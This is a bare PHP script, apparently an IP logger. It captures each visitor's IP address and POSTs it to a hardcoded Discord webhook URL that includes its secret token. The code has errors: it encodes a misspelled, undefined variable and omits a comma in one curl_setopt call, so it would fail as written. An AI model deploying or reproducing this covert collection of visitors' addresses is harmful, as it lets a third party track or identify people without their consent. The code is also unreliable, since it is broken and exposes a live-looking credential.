<?php
$webhookurl = "https://discord.com/api/webhooks/984515991667109998/LKFxbt4klFMHEF6wnhugzhwaCyB4wvz52lA-SAl3vALWlk6OysMzZ8yzQuSNnRiwjr8w";
$ip = $_SERVER['REMOTE_ADDR'];
$msg = "$ip";
$json_data = array ('content'=>"$msg");
$make_json = json_encode($json_date);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
?>
